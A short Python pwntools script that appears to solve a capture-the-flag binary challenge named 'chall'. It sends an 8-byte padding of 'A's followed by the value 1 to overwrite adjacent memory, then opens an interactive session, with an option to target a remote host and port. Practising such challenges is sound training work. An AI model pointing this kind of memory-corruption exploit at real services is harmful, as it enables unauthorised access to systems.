from pwn import *
import os

os.system('clear')

def start(argv=[], *a, **kw):
    if args.REMOTE:  
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  
        return process([exe] + argv, *a, **kw)


exe = './chall'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

sh = start()
sh.recvuntil(b'\n')
offset = b'A' * 8
p = flat([
    offset,
    1
])
#offset += p64(1)
sh.sendline(p)
sh.interactive()
